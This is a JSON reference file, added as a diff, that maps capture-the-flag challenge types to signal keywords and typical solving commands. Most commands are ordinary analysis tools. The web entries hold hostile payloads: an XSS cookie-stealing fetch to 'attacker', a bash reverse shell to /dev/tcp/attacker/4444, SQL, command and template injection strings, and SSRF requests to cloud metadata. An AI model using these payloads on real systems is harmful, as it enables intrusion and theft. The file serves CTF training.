@@ -1,0 +1,993 @@
+[
+  {
+    "id": "pwn-stack-overflow-basic",
+    "category": "pwn",
+    "name": "Basic Stack Buffer Overflow",
+    "source": "picoCTF 2023",
+    "signal_weights": {
+      "gets": 0.9,
+      "strcpy": 0.8,
+      "strcat": 0.7,
+      "dangerous import": 0.8,
+      "unsafe function": 0.8,
+      "no canary": 0.9,
+      "nx enabled": 0.3,
+      "stack overflow": 0.9,
+      "binary analysis": 0.4
+    },
+    "typical_transforms": [
+      "checksec --file=./binary",
+      "python3 -c \"print('A'*200)\" | ./binary",
+      "cyclic 200 | ./binary",
+      "ROPgadget --binary ./binary --rop"
+    ],
+    "description": "Classic stack buffer overflow with no stack canary. Overwrite saved return address to redirect execution.",
+    "solve_rate_hint": "high"
+  },
+  {
+    "id": "pwn-format-string",
+    "category": "pwn",
+    "name": "Format String Vulnerability",
+    "source": "picoCTF 2022",
+    "signal_weights": {
+      "printf": 0.9,
+      "fprintf": 0.8,
+      "sprintf": 0.7,
+      "format string": 0.95,
+      "%n": 0.9,
+      "%p": 0.7,
+      "user-controlled format": 0.9,
+      "dangerous import": 0.5
+    },
+    "typical_transforms": [
+      "python3 -c \"print('%p ' * 20)\" | ./binary",
+      "python3 -c \"print('%7$s')\" | ./binary",
+      "pwntools fmtstr_payload(offset, {target_addr: value})"
+    ],
+    "description": "Uncontrolled format string passed to printf family. Enables stack leaks and arbitrary writes.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "pwn-rop-chain",
+    "category": "pwn",
+    "name": "ROP Chain / ret2libc",
+    "source": "HTB 2023",
+    "signal_weights": {
+      "rop gadget": 0.9,
+      "ret2libc": 0.9,
+      "nx enabled": 0.8,
+      "no canary": 0.7,
+      "gets": 0.6,
+      "rwx segment": 0.3,
+      "stack overflow": 0.7,
+      "libc leak": 0.8,
+      "plt": 0.6,
+      "got": 0.6
+    },
+    "typical_transforms": [
+      "ROPgadget --binary ./binary --rop",
+      "ropper --file ./binary --search 'pop rdi'",
+      "pwn.ELF('./binary').plt['puts']",
+      "one_gadget libc.so.6"
+    ],
+    "description": "NX-enabled binary requiring a ROP chain, typically ret2libc or one_gadget to get shell.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "pwn-heap-overflow",
+    "category": "pwn",
+    "name": "Heap Overflow / Use-After-Free",
+    "source": "HTB 2024",
+    "signal_weights": {
+      "malloc": 0.7,
+      "free": 0.7,
+      "heap": 0.9,
+      "use after free": 0.9,
+      "double free": 0.9,
+      "tcache": 0.8,
+      "fastbin": 0.8,
+      "chunk": 0.7
+    },
+    "typical_transforms": [
+      "gdb ./binary -ex 'heap chunks'",
+      "pwndbg heap",
+      "pwntools tcache_poisoning exploit"
+    ],
+    "description": "Heap corruption via overflow or UAF. Targets ptmalloc2 structures for code execution.",
+    "solve_rate_hint": "low"
+  },
+  {
+    "id": "pwn-shellcode",
+    "category": "pwn",
+    "name": "Shellcode Injection",
+    "source": "picoCTF 2021",
+    "signal_weights": {
+      "rwx segment": 0.95,
+      "executable stack": 0.9,
+      "shellcode": 0.9,
+      "nx: no": 0.9,
+      "mprotect": 0.6,
+      "mmap": 0.5,
+      "stack overflow": 0.6
+    },
+    "typical_transforms": [
+      "python3 -c \"import pwn; print(pwn.shellcraft.sh())\"",
+      "pwntools asm(shellcraft.sh())",
+      "msfvenom -p linux/x64/exec CMD=/bin/sh -f py"
+    ],
+    "description": "Executable stack or heap allows injecting and jumping to shellcode.",
+    "solve_rate_hint": "high"
+  },
+  {
+    "id": "rev-upx-packed",
+    "category": "rev",
+    "name": "UPX-Packed Binary",
+    "source": "picoCTF 2023",
+    "signal_weights": {
+      "upx": 0.95,
+      "packed": 0.8,
+      "packer": 0.8,
+      "upx magic": 0.95,
+      "high entropy": 0.5,
+      "compressed section": 0.6
+    },
+    "typical_transforms": [
+      "upx -d ./binary",
+      "strings ./binary | grep UPX",
+      "file ./binary"
+    ],
+    "description": "Binary compressed with UPX packer. Must be unpacked before analysis.",
+    "solve_rate_hint": "high"
+  },
+  {
+    "id": "rev-obfuscated-strings",
+    "category": "rev",
+    "name": "Obfuscated / XOR-encoded Strings",
+    "source": "HTB 2023",
+    "signal_weights": {
+      "xor": 0.8,
+      "obfuscated": 0.8,
+      "encoded string": 0.7,
+      "string decryption": 0.7,
+      "high entropy": 0.5,
+      "rot": 0.4,
+      "base64": 0.3
+    },
+    "typical_transforms": [
+      "strings ./binary | grep -i key",
+      "xortool -x ./binary",
+      "python3 -c \"data=open('./binary','rb').read(); [print(chr(b^k),end='') for b in data for k in range(256)]\""
+    ],
+    "description": "Binary contains obfuscated strings decoded at runtime, typically via XOR or custom encoding.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "rev-anti-debug",
+    "category": "rev",
+    "name": "Anti-Debugging Techniques",
+    "source": "CTFtime 2023",
+    "signal_weights": {
+      "anti-debug": 0.9,
+      "ptrace": 0.9,
+      "isdebuggerpresent": 0.9,
+      "timing check": 0.7,
+      "int3": 0.7,
+      "sigtrap": 0.7,
+      "prctl": 0.6
+    },
+    "typical_transforms": [
+      "strace ./binary 2>&1 | head",
+      "gdb -ex 'catch syscall ptrace' ./binary",
+      "LD_PRELOAD=./bypass.so ./binary"
+    ],
+    "description": "Binary uses anti-debugging tricks (ptrace, timing checks) to prevent dynamic analysis.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "rev-vm-bytecode",
+    "category": "rev",
+    "name": "Custom VM / Bytecode Interpreter",
+    "source": "HTB 2024",
+    "signal_weights": {
+      "opcode": 0.9,
+      "bytecode": 0.9,
+      "virtual machine": 0.9,
+      "interpreter": 0.8,
+      "dispatch table": 0.8,
+      "switch": 0.4
+    },
+    "typical_transforms": [
+      "Identify opcode dispatch loop in IDA/Ghidra",
+      "Script to disassemble bytecode",
+      "z3 constraint solver for bytecode verification"
+    ],
+    "description": "Binary implements a custom VM with bytecode. Requires disassembling the bytecode layer.",
+    "solve_rate_hint": "low"
+  },
+  {
+    "id": "rev-license-check",
+    "category": "rev",
+    "name": "License / Serial Key Validation",
+    "source": "picoCTF 2022",
+    "signal_weights": {
+      "strcmp": 0.7,
+      "strncmp": 0.7,
+      "memcmp": 0.7,
+      "license": 0.8,
+      "serial": 0.8,
+      "key check": 0.8,
+      "correct": 0.5,
+      "wrong": 0.5
+    },
+    "typical_transforms": [
+      "angr symbolic execution",
+      "gdb break at strcmp",
+      "ltrace ./binary",
+      "z3 constraint solver"
+    ],
+    "description": "Binary validates a license key or serial number. Angr or symbolic execution can find valid inputs.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "crypto-rsa-small-e",
+    "category": "crypto",
+    "name": "RSA Small Public Exponent (e=3)",
+    "source": "picoCTF 2023",
+    "signal_weights": {
+      "rsa": 0.8,
+      "e=3": 0.95,
+      "small exponent": 0.95,
+      "small public exponent": 0.95,
+      "cube root": 0.9,
+      "broadcast attack": 0.7
+    },
+    "typical_transforms": [
+      "python3 -c \"import gmpy2; m=gmpy2.iroot(c,3)[0]; print(bytes.fromhex(hex(m)[2:]))\"",
+      "Hastad broadcast attack if 3+ ciphertexts",
+      "sage: c.nth_root(3)"
+    ],
+    "description": "RSA with e=3 and plaintext smaller than N. Cube root of ciphertext recovers plaintext directly.",
+    "solve_rate_hint": "high"
+  },
+  {
+    "id": "crypto-rsa-factorable-n",
+    "category": "crypto",
+    "name": "RSA Factorable Modulus",
+    "source": "picoCTF 2022",
+    "signal_weights": {
+      "rsa": 0.7,
+      "factorable": 0.9,
+      "small prime": 0.9,
+      "factordb": 0.9,
+      "p close to q": 0.8,
+      "fermat": 0.7,
+      "weak modulus": 0.8
+    },
+    "typical_transforms": [
+      "factordb.com lookup of N",
+      "python3 fermat_factor.py",
+      "sage: factor(N)",
+      "msieve -q N"
+    ],
+    "description": "RSA modulus N is factorable via FactorDB, Fermat factoring, or other methods.",
+    "solve_rate_hint": "high"
+  },
+  {
+    "id": "crypto-rsa-common-modulus",
+    "category": "crypto",
+    "name": "RSA Common Modulus Attack",
+    "source": "CTFtime 2023",
+    "signal_weights": {
+      "rsa": 0.7,
+      "common modulus": 0.95,
+      "same n": 0.9,
+      "multiple ciphertexts": 0.6,
+      "gcd": 0.5,
+      "coprime": 0.6
+    },
+    "typical_transforms": [
+      "Compute gcd(e1,e2) == 1",
+      "Extended Euclidean to find s1,s2: e1*s1+e2*s2=1",
+      "m = pow(c1,s1,N) * pow(c2,s2,N) % N"
+    ],
+    "description": "Same message encrypted with same N but different exponents allows modular arithmetic recovery.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "crypto-aes-ecb",
+    "category": "crypto",
+    "name": "AES-ECB Mode Weakness",
+    "source": "picoCTF 2023",
+    "signal_weights": {
+      "aes": 0.7,
+      "ecb": 0.9,
+      "repeating blocks": 0.9,
+      "block cipher": 0.5,
+      "identical blocks": 0.9,
+      "block boundary": 0.6
+    },
+    "typical_transforms": [
+      "Split ciphertext into 16-byte blocks, look for repeats",
+      "Byte-at-a-time ECB decryption oracle",
+      "python3 aes_ecb_oracle.py"
+    ],
+    "description": "AES in ECB mode leaks patterns. Byte-at-a-time attacks or chosen-plaintext can recover plaintext.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "crypto-xor-repeating-key",
+    "category": "crypto",
+    "name": "Repeating-Key XOR Cipher",
+    "source": "picoCTF 2021",
+    "signal_weights": {
+      "xor": 0.9,
+      "repeating key": 0.9,
+      "key length": 0.8,
+      "index of coincidence": 0.8,
+      "hamming distance": 0.7,
+      "vigenere": 0.4
+    },
+    "typical_transforms": [
+      "xortool -l keylen ciphertext",
+      "xortool -c ' ' ciphertext",
+      "python3 kasiski.py ciphertext",
+      "dcode.fr Vigenere / XOR analyzer"
+    ],
+    "description": "Ciphertext XOR'd with a repeating key. Kasiski test or index of coincidence finds key length.",
+    "solve_rate_hint": "high"
+  },
+  {
+    "id": "crypto-caesar-rot",
+    "category": "crypto",
+    "name": "Caesar / ROT Cipher",
+    "source": "picoCTF 2020",
+    "signal_weights": {
+      "caesar": 0.9,
+      "rot": 0.8,
+      "rot13": 0.9,
+      "shift cipher": 0.9,
+      "classical cipher": 0.7,
+      "letter frequency": 0.6
+    },
+    "typical_transforms": [
+      "python3 -c \"import codecs; print(codecs.decode('CIPHERTEXT','rot_13'))\"",
+      "for i in range(26): print(i, caesar_decrypt(ct, i))",
+      "dcode.fr Caesar cipher"
+    ],
+    "description": "Single-byte alphabetic shift. Try all 26 offsets or use frequency analysis.",
+    "solve_rate_hint": "high"
+  },
+  {
+    "id": "crypto-vigenere",
+    "category": "crypto",
+    "name": "Vigenere Cipher",
+    "source": "picoCTF 2022",
+    "signal_weights": {
+      "vigenere": 0.95,
+      "polyalphabetic": 0.8,
+      "kasiski": 0.8,
+      "index of coincidence": 0.7,
+      "classical cipher": 0.6
+    },
+    "typical_transforms": [
+      "dcode.fr Vigenere cipher autosolve",
+      "python3 vigenere_crack.py --kasiski ciphertext",
+      "quipqiup.com for substitution-based approach"
+    ],
+    "description": "Polyalphabetic substitution cipher. Kasiski examination or IoC finds key length, then frequency analysis.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "crypto-base64-encoding",
+    "category": "crypto",
+    "name": "Base64 / Multi-layer Encoding",
+    "source": "picoCTF 2021",
+    "signal_weights": {
+      "base64": 0.9,
+      "base32": 0.7,
+      "base58": 0.6,
+      "encoding": 0.6,
+      "multiple encoding": 0.7,
+      "decode": 0.4
+    },
+    "typical_transforms": [
+      "base64 -d <<< \"ENCODED_STRING\"",
+      "python3 -c \"import base64; print(base64.b64decode('...'))\""
+    ],
+    "description": "Flag or key encoded in base64 or multiple layers of encoding. Iterative decode until plaintext.",
+    "solve_rate_hint": "high"
+  },
+  {
+    "id": "steg-png-lsb",
+    "category": "steg",
+    "name": "PNG LSB Steganography",
+    "source": "picoCTF 2023",
+    "signal_weights": {
+      "lsb": 0.9,
+      "steganography": 0.8,
+      "chi-square": 0.8,
+      "lsb anomaly": 0.9,
+      "png": 0.5,
+      "pixel data": 0.6,
+      "stegsolve": 0.7
+    },
+    "typical_transforms": [
+      "zsteg image.png",
+      "stegsolve.jar",
+      "python3 -c \"from PIL import Image; ...\" LSB extraction",
+      "steghide extract -sf image.png"
+    ],
+    "description": "Data hidden in least-significant bits of PNG pixel channels.",
+    "solve_rate_hint": "high"
+  },
+  {
+    "id": "steg-image-appended-data",
+    "category": "steg",
+    "name": "Appended Data After Image EOF",
+    "source": "HTB 2023",
+    "signal_weights": {
+      "appended": 0.9,
+      "overlay": 0.9,
+      "after eof": 0.9,
+      "after end": 0.9,
+      "binwalk": 0.7,
+      "zip magic": 0.6,
+      "pk magic": 0.6
+    },
+    "typical_transforms": [
+      "binwalk -e image.jpg",
+      "foremost -i image.jpg",
+      "dd if=image.jpg skip=OFFSET bs=1",
+      "xxd image.jpg | tail"
+    ],
+    "description": "Arbitrary data appended after image EOF marker. Common for embedded ZIPs, text, or flags.",
+    "solve_rate_hint": "high"
+  },
+  {
+    "id": "steg-exif-metadata",
+    "category": "steg",
+    "name": "EXIF / Metadata Hidden Data",
+    "source": "picoCTF 2022",
+    "signal_weights": {
+      "exif": 0.9,
+      "metadata": 0.8,
+      "comment": 0.7,
+      "gps": 0.6,
+      "thumbnail": 0.6,
+      "xmp": 0.6,
+      "author": 0.5
+    },
+    "typical_transforms": [
+      "exiftool image.jpg",
+      "strings image.jpg | grep -i ctf",
+      "exiv2 image.jpg"
+    ],
+    "description": "Flag or hint hidden in EXIF metadata fields such as comment, GPS, or custom tags.",
+    "solve_rate_hint": "high"
+  },
+  {
+    "id": "steg-audio-lsb",
+    "category": "steg",
+    "name": "Audio LSB / Spectrogram Steganography",
+    "source": "picoCTF 2023",
+    "signal_weights": {
+      "wav": 0.7,
+      "audio": 0.6,
+      "lsb": 0.7,
+      "spectrogram": 0.9,
+      "dtmf": 0.8,
+      "morse": 0.8,
+      "silence": 0.6,
+      "mp3": 0.4
+    },
+    "typical_transforms": [
+      "Audacity spectrogram view",
+      "sox input.wav output.png spectrogram",
+      "python3 wav_lsb.py input.wav",
+      "multimon-ng -t wav -a DTMF input.wav"
+    ],
+    "description": "Data hidden in audio via LSB encoding, DTMF tones, or visible patterns in spectrogram.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "steg-steghide-jpeg",
+    "category": "steg",
+    "name": "Steghide-encoded JPEG",
+    "source": "CTFtime 2022",
+    "signal_weights": {
+      "steghide": 0.9,
+      "jpeg": 0.5,
+      "jfif": 0.5,
+      "password": 0.6,
+      "embedded file": 0.7,
+      "steg payload": 0.8
+    },
+    "typical_transforms": [
+      "steghide extract -sf image.jpg",
+      "steghide extract -sf image.jpg -p ''",
+      "stegseek image.jpg rockyou.txt"
+    ],
+    "description": "JPEG with data embedded via steghide tool. Often protected by a passphrase.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "forensics-pcap-analysis",
+    "category": "forensics",
+    "name": "PCAP Network Traffic Analysis",
+    "source": "picoCTF 2023",
+    "signal_weights": {
+      "pcap": 0.9,
+      "wireshark": 0.7,
+      "network": 0.6,
+      "http": 0.5,
+      "ftp": 0.6,
+      "dns exfiltration": 0.8,
+      "tcp stream": 0.6
+    },
+    "typical_transforms": [
+      "wireshark capture.pcap",
+      "tshark -r capture.pcap -Y 'http' -T fields -e http.file_data",
+      "strings capture.pcap | grep -i flag",
+      "tcpflow -r capture.pcap"
+    ],
+    "description": "Network capture containing challenge data, credentials, or flag in cleartext or encoded.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "forensics-pdf-javascript",
+    "category": "forensics",
+    "name": "PDF with Embedded JavaScript",
+    "source": "HTB 2023",
+    "signal_weights": {
+      "pdf": 0.7,
+      "javascript": 0.8,
+      "embedded script": 0.8,
+      "pdf javascript": 0.9,
+      "stream": 0.5,
+      "flate": 0.4
+    },
+    "typical_transforms": [
+      "pdf-parser.py challenge.pdf",
+      "pdfextract challenge.pdf",
+      "peepdf challenge.pdf"
+    ],
+    "description": "PDF containing JavaScript that encodes or reveals the flag when executed.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "forensics-zip-encrypted",
+    "category": "forensics",
+    "name": "Encrypted ZIP Archive",
+    "source": "picoCTF 2022",
+    "signal_weights": {
+      "encrypted zip": 0.9,
+      "password-protected": 0.9,
+      "encrypted entr": 0.8,
+      "zip": 0.6,
+      "password candidate": 0.7,
+      "wordlist": 0.5
+    },
+    "typical_transforms": [
+      "fcrackzip -u -D -p rockyou.txt challenge.zip",
+      "john --format=zip zip_hash.txt",
+      "hashcat -m 13600 zip_hash.txt rockyou.txt"
+    ],
+    "description": "ZIP archive protected with a password requiring brute-force or dictionary attack.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "forensics-disk-image",
+    "category": "forensics",
+    "name": "Disk Image / File System Recovery",
+    "source": "HTB 2024",
+    "signal_weights": {
+      "disk image": 0.9,
+      "ext4": 0.8,
+      "fat32": 0.7,
+      "deleted file": 0.9,
+      "inode": 0.7,
+      "photorec": 0.6,
+      "autopsy": 0.6
+    },
+    "typical_transforms": [
+      "autopsy disk.img",
+      "photorec disk.img",
+      "testdisk disk.img",
+      "ext4magic disk.img -r /deleted_file"
+    ],
+    "description": "Disk image with deleted or hidden files requiring forensic recovery tools.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "forensics-sqlite-blob",
+    "category": "forensics",
+    "name": "SQLite Database with Blob Data",
+    "source": "CTFtime 2023",
+    "signal_weights": {
+      "sqlite": 0.9,
+      "database": 0.7,
+      "blob": 0.8,
+      "sql": 0.6,
+      "table": 0.5,
+      "row": 0.4
+    },
+    "typical_transforms": [
+      "sqlite3 database.db '.tables'",
+      "sqlite3 database.db 'SELECT * FROM secrets'",
+      "sqlitebrowser database.db"
+    ],
+    "description": "SQLite database containing flag or key in blob column or hidden table.",
+    "solve_rate_hint": "high"
+  },
+  {
+    "id": "forensics-memory-dump",
+    "category": "forensics",
+    "name": "Memory Dump / Volatility Analysis",
+    "source": "HTB 2024",
+    "signal_weights": {
+      "memory dump": 0.9,
+      "volatility": 0.9,
+      "ram": 0.7,
+      "process list": 0.6,
+      "registry": 0.6,
+      "kdbgscan": 0.8
+    },
+    "typical_transforms": [
+      "volatility3 -f memory.raw windows.info",
+      "volatility3 -f memory.raw windows.pslist",
+      "volatility3 -f memory.raw windows.dumpfiles --pid PID",
+      "strings memory.raw | grep -i flag"
+    ],
+    "description": "RAM dump requiring Volatility analysis to extract processes, files, or credentials.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "web-sql-injection",
+    "category": "web",
+    "name": "SQL Injection",
+    "source": "picoCTF 2023",
+    "signal_weights": {
+      "sql injection": 0.95,
+      "sqli": 0.9,
+      "union select": 0.9,
+      "error-based": 0.8,
+      "blind": 0.7,
+      "database": 0.5,
+      "login bypass": 0.6
+    },
+    "typical_transforms": [
+      "sqlmap -u 'http://target/?id=1' --dbs",
+      "' OR '1'='1",
+      "' UNION SELECT NULL,NULL,NULL--",
+      "sqlmap --tamper=space2comment"
+    ],
+    "description": "User-controlled input passed to SQL query without sanitization. SQLMap automates exploitation.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "web-xss",
+    "category": "web",
+    "name": "Cross-Site Scripting (XSS)",
+    "source": "HTB 2023",
+    "signal_weights": {
+      "xss": 0.95,
+      "cross-site scripting": 0.9,
+      "reflected": 0.7,
+      "stored xss": 0.8,
+      "javascript injection": 0.8,
+      "script tag": 0.7
+    },
+    "typical_transforms": [
+      "<script>alert(1)</script>",
+      "<img src=x onerror=fetch('http://attacker/?c='+document.cookie)>",
+      "XSSHunter payload for blind XSS"
+    ],
+    "description": "User input reflected into HTML without encoding, enabling script injection.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "web-lfi",
+    "category": "web",
+    "name": "Local File Inclusion (LFI)",
+    "source": "picoCTF 2022",
+    "signal_weights": {
+      "lfi": 0.9,
+      "local file inclusion": 0.9,
+      "path traversal": 0.8,
+      "directory traversal": 0.8,
+      "etc/passwd": 0.9,
+      "include": 0.5
+    },
+    "typical_transforms": [
+      "curl 'http://target/?page=../../../../etc/passwd'",
+      "curl 'http://target/?file=php://filter/read=convert.base64-encode/resource=index.php'",
+      "wfuzz -w traversal_list.txt -u 'http://target/?page=FUZZ'"
+    ],
+    "description": "File path parameter allows reading arbitrary server files via directory traversal.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "web-command-injection",
+    "category": "web",
+    "name": "Command Injection",
+    "source": "HTB 2023",
+    "signal_weights": {
+      "command injection": 0.95,
+      "os.system": 0.8,
+      "exec": 0.6,
+      "ping": 0.5,
+      "shell": 0.6,
+      "system call": 0.7,
+      "subprocess": 0.6
+    },
+    "typical_transforms": [
+      "; id",
+      "| id",
+      "&& id",
+      "`id`",
+      "$(id)",
+      "bash -i >& /dev/tcp/attacker/4444 0>&1"
+    ],
+    "description": "User input passed to OS shell command without sanitization. Enables arbitrary command execution.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "web-ssti",
+    "category": "web",
+    "name": "Server-Side Template Injection (SSTI)",
+    "source": "CTFtime 2023",
+    "signal_weights": {
+      "ssti": 0.95,
+      "template injection": 0.9,
+      "jinja2": 0.8,
+      "twig": 0.7,
+      "freemarker": 0.7,
+      "expression language": 0.6
+    },
+    "typical_transforms": [
+      "{{7*7}} - test for SSTI",
+      "{{config.__class__.__mro__[-1].__subclasses__()}}",
+      "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}"
+    ],
+    "description": "User input injected into server-side template engine. RCE possible via template gadgets.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "web-jwt-weakness",
+    "category": "web",
+    "name": "JWT Weakness / Algorithm Confusion",
+    "source": "HTB 2024",
+    "signal_weights": {
+      "jwt": 0.9,
+      "json web token": 0.9,
+      "alg none": 0.9,
+      "algorithm confusion": 0.8,
+      "hs256": 0.6,
+      "rs256": 0.6,
+      "secret": 0.4
+    },
+    "typical_transforms": [
+      "jwt_tool token.txt -X a",
+      "python3 -c \"import jwt; jwt.encode({...}, '', algorithm='none')\"",
+      "hashcat -m 16500 jwt.txt rockyou.txt"
+    ],
+    "description": "JWT with weak secret, none algorithm, or RS256-to-HS256 confusion attack.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "forensics-docx-hidden",
+    "category": "forensics",
+    "name": "DOCX / Office Document Hidden Data",
+    "source": "picoCTF 2022",
+    "signal_weights": {
+      "docx": 0.8,
+      "office": 0.7,
+      "xml": 0.5,
+      "hidden text": 0.8,
+      "word": 0.6,
+      "comments": 0.6,
+      "track changes": 0.6,
+      "metadata": 0.5
+    },
+    "typical_transforms": [
+      "unzip challenge.docx -d docx_extracted/",
+      "cat docx_extracted/word/document.xml | grep -i flag",
+      "strings challenge.docx | grep -i ctf"
+    ],
+    "description": "Word DOCX (ZIP of XML) with flag hidden in document XML, comments, or metadata.",
+    "solve_rate_hint": "high"
+  },
+  {
+    "id": "crypto-padding-oracle",
+    "category": "crypto",
+    "name": "CBC Padding Oracle Attack",
+    "source": "HTB 2023",
+    "signal_weights": {
+      "padding": 0.8,
+      "oracle": 0.8,
+      "cbc": 0.9,
+      "padding oracle": 0.95,
+      "pkcs7": 0.8,
+      "block cipher": 0.5,
+      "aes": 0.4
+    },
+    "typical_transforms": [
+      "padbuster http://target/decrypt CIPHERTEXT 16",
+      "python3 padding_oracle.py",
+      "burpsuite intruder for oracle detection"
+    ],
+    "description": "AES-CBC with a padding validation oracle enables byte-by-byte plaintext recovery.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "crypto-hash-length-extension",
+    "category": "crypto",
+    "name": "Hash Length Extension Attack",
+    "source": "CTFtime 2022",
+    "signal_weights": {
+      "md5": 0.6,
+      "sha1": 0.6,
+      "sha256": 0.5,
+      "length extension": 0.95,
+      "mac": 0.7,
+      "hash": 0.4,
+      "signature": 0.5
+    },
+    "typical_transforms": [
+      "hash_extender --data='original' --secret-length=16 --append='append' --signature=HASH",
+      "python3 hlextend.py"
+    ],
+    "description": "MD5/SHA1/SHA256 used as MAC with secret-prefix. Hash length extension forges valid signatures.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "steg-png-palette",
+    "category": "steg",
+    "name": "PNG Palette / Color Channel Anomaly",
+    "source": "CTFtime 2023",
+    "signal_weights": {
+      "palette": 0.8,
+      "plte": 0.8,
+      "color channel": 0.7,
+      "rgb": 0.5,
+      "alpha": 0.6,
+      "rgba": 0.6,
+      "png": 0.4
+    },
+    "typical_transforms": [
+      "stegsolve.jar - cycle color channels",
+      "python3 -c \"from PIL import Image; img=Image.open('f.png').convert('RGBA'); ...\"",
+      "zsteg -a image.png"
+    ],
+    "description": "Data encoded in specific color channel values or PNG palette entries.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "pwn-integer-overflow",
+    "category": "pwn",
+    "name": "Integer Overflow / Signedness Bug",
+    "source": "picoCTF 2022",
+    "signal_weights": {
+      "integer overflow": 0.9,
+      "signedness": 0.8,
+      "atoi": 0.6,
+      "unsigned": 0.5,
+      "type confusion": 0.7,
+      "size_t": 0.5
+    },
+    "typical_transforms": [
+      "Provide negative or very large integer inputs",
+      "python3 -c \"print(-1)\" | ./binary",
+      "INT_MAX + 1 overflow test"
+    ],
+    "description": "Signed/unsigned integer confusion or overflow allowing out-of-bounds memory access.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "forensics-steganography-whitespace",
+    "category": "forensics",
+    "name": "Whitespace / Invisible Character Steganography",
+    "source": "picoCTF 2021",
+    "signal_weights": {
+      "whitespace": 0.9,
+      "stegsnow": 0.9,
+      "invisible": 0.8,
+      "zero-width": 0.8,
+      "tabs": 0.6,
+      "spaces": 0.5,
+      "unicode": 0.5
+    },
+    "typical_transforms": [
+      "stegsnow -C file.txt",
+      "cat -A file.txt | grep '\\^I\\|\\$'",
+      "python3 -c \"open('f.txt').read().replace(' ','0').replace('\\t','1')\""
+    ],
+    "description": "Data hidden using whitespace characters (tabs/spaces) or zero-width Unicode characters.",
+    "solve_rate_hint": "high"
+  },
+  {
+    "id": "rev-golang-binary",
+    "category": "rev",
+    "name": "Golang Binary Reverse Engineering",
+    "source": "HTB 2024",
+    "signal_weights": {
+      "golang": 0.9,
+      "go binary": 0.9,
+      "goroutine": 0.7,
+      "runtime": 0.6,
+      "main.main": 0.7,
+      "strip": 0.4
+    },
+    "typical_transforms": [
+      "go-strip tool to recover symbols",
+      "IDA Pro with GoReSym plugin",
+      "Ghidra with Go binary analysis",
+      "strings ./binary | grep -E 'main\\.|runtime\\.'"
+    ],
+    "description": "Golang-compiled binary with goroutines and runtime. Requires Go-specific reversing tools.",
+    "solve_rate_hint": "low"
+  },
+  {
+    "id": "crypto-one-time-pad-reuse",
+    "category": "crypto",
+    "name": "One-Time Pad Key Reuse",
+    "source": "CTFtime 2023",
+    "signal_weights": {
+      "one-time pad": 0.9,
+      "otp": 0.8,
+      "key reuse": 0.95,
+      "xor": 0.5,
+      "crib dragging": 0.9,
+      "same key": 0.8
+    },
+    "typical_transforms": [
+      "crib drag: XOR two ciphertexts, then XOR with known plaintext",
+      "python3 cribdrag.py c1 c2",
+      "xortool --show-analysis ciphertext"
+    ],
+    "description": "OTP reused with the same key for two plaintexts. XOR both ciphertexts to cancel key.",
+    "solve_rate_hint": "medium"
+  },
+  {
+    "id": "forensics-zip-comment",
+    "category": "forensics",
+    "name": "ZIP Comment / Archive Metadata",
+    "source": "picoCTF 2022",
+    "signal_weights": {
+      "zip comment": 0.9,
+      "archive comment": 0.9,
+      "comment non-empty": 0.9,
+      "comment:": 0.8,
+      "zip": 0.4
+    },
+    "typical_transforms": [
+      "unzip -z challenge.zip",
+      "7z l challenge.zip",
+      "python3 -c \"import zipfile; z=zipfile.ZipFile('c.zip'); print(z.comment)\""
+    ],
+    "description": "Flag hidden in ZIP central directory comment field.",
+    "solve_rate_hint": "high"
+  },
+  {
+    "id": "web-ssrf",
+    "category": "web",
+    "name": "Server-Side Request Forgery (SSRF)",
+    "source": "HTB 2024",
+    "signal_weights": {
+      "ssrf": 0.95,
+      "server-side request forgery": 0.9,
+      "internal": 0.6,
+      "metadata": 0.5,
+      "aws": 0.5,
+      "169.254": 0.8,
+      "localhost": 0.6
+    },
+    "typical_transforms": [
+      "curl -d 'url=http://169.254.169.254/latest/meta-data/' http://target/fetch",
+      "curl -d 'url=http://localhost:8080/admin' http://target/fetch",
+      "ssrfmap for automated exploitation"
+    ],
+    "description": "Application fetches user-supplied URLs, allowing access to internal services or cloud metadata.",
+    "solve_rate_hint": "medium"
+  }
+]
